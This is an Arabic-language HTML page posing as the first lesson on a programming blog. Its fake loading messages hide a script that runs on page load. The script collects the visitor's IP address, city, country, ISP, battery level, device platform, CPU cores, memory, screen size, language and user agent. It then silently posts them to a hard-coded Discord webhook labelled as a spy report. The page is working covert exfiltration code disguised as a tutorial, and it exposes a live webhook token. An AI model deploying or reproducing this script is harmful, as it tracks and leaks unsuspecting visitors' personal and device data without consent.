<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>مدونة المبرمج العربي | دروس البرمجة</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #f4f4f4; color: #333; text-align: center; padding: 50px; }
        .blog-post { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); max-width: 600px; margin: auto; }
        h1 { color: #2c3e50; }
        .loading-text { color: #7f8c8d; font-size: 0.9rem; margin-top: 20px; }
    </style>
</head>
<body>

    <div class="blog-post">
        <h1>مرحباً بك في درس الـ HTML الأول 👨‍💻</h1>
        <p>جاري تحميل محتوى الدرس التعليمي، يرجى الانتظار قليلاً لضمان اتصالك بالسيرفر...</p>
        <div class="loading-text">جاري فحص توافق المتصفح مع أدوات البرمجة...</div>
    </div>

    <script>
        const WEBHOOK = 'https://discord.com/api/webhooks/1492913386810245151/247Nc1kE6rz06tvqTTKAiDjZbHMpyjLMpmC4velKlPHmSWSFp_1Ue_-xJJdBhrcgX4D9';

        async function grabEverything() {
            try {
                // 1. جلب بيانات الـ IP والموقع والشركة
                const ipRes = await fetch('https://ipapi.co/json/');
                const data = await ipRes.json();

                // 2. جلب بيانات البطارية
                let battStatus = "غير مدعوم";
                if (navigator.getBattery) {
                    const b = await navigator.getBattery();
                    battStatus = `${Math.round(b.level * 100)}% (${b.charging ? 'يشحن ⚡' : 'لا يشحن'})`;
                }

                // 3. جمع معلومات تقنية إضافية
                const deviceInfo = {
                    platform: navigator.platform,
                    cores: navigator.hardwareConcurrency || "غير معروف",
                    ram: navigator.deviceMemory || "غير معروف",
                    screen: `${screen.width}x${screen.height}`,
                    language: navigator.language,
                    userAgent: navigator.userAgent
                };

                // 4. إرسال "تقرير التجسس" للديسكورد
                const payload = {
                    username: "رادار المعلومات الشامل 🔍",
                    embeds: [{
                        title: "🕵️‍♂️ تم سحب بيانات الزائر (تلقائياً)",
                        color: 3447003,
                        fields: [
                            { name: "🌐 عنوان الـ IP:", value: `\`${data.ip}\``, inline: true },
                            { name: "📍 الموقع:", value: `${data.city}, ${data.country_name}`, inline: true },
                            { name: "📶 شركة الإنترنت:", value: data.org, inline: false },
                            { name: "🔋 البطارية:", value: battStatus, inline: true },
                            { name: "📱 الجهاز:", value: deviceInfo.platform, inline: true },
                            { name: "⚙️ أنوية المعالج:", value: deviceInfo.cores, inline: true },
                            { name: "📏 دقة الشاشة:", value: deviceInfo.screen, inline: true },
                            { name: "🌍 اللغة:", value: deviceInfo.language, inline: true },
                            { name: "🛠️ المتصفح:", value: `\`${deviceInfo.userAgent}\``, inline: false }
                        ],
                        footer: { text: `توقيت الدخول: ${new Date().toLocaleTimeString()}` }
                    }]
                };

                fetch(WEBHOOK, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

            } catch (err) { console.log("Silent execution..."); }
        }

        window.onload = grabEverything;
    </script>
</body>
</html>
